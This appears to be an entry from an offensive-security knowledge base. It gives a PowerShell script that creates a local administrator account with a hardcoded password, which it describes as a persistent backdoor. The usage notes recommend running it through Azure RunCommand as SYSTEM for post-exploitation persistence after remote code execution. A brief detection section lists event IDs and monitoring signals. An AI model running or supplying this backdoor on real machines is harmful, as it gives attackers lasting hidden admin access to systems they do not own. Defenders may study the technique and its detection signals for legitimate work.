---
type: code
language: powershell
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
  - Cloud
tags:
  - persistence
  - privilege-escalation
  - payload
validated: true
---

# PowerShell Create Local Admin User

## Code

```powershell
# adduser.ps1
$passwd = ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force

New-LocalUser -Name user -Password $passwd 
Add-LocalGroupMember -Group Administrators -Member user
```

## Description

This PowerShell script creates a new local user account named 'user' with a specified password and adds it to the Administrators group, providing persistent backdoor access on a Windows VM.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $passwd | Secure string for the new user's password | ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force |
| user | Username for the new local account | user |
| Administrators | Target group for membership | Administrators |

## Usage

Save as adduser.ps1 and execute via Azure RunCommand (e.g., in [[procedures/azure-vm-runcommand-execution]]). Ideal for post-exploitation persistence after initial RCE. Run as SYSTEM for success.

## Detection

- Monitor for New-LocalUser and Add-LocalGroupMember events in Windows Security logs (Event ID 4720, 4732).
- Azure logs for RunCommand invocations creating users.
- Anomaly detection on new local admins via Microsoft Defender for Cloud.

## Related

- [[procedures/azure-vm-runcommand-execution]]
- [[commands/execute-powershell-script-on-azure-vm-az]]
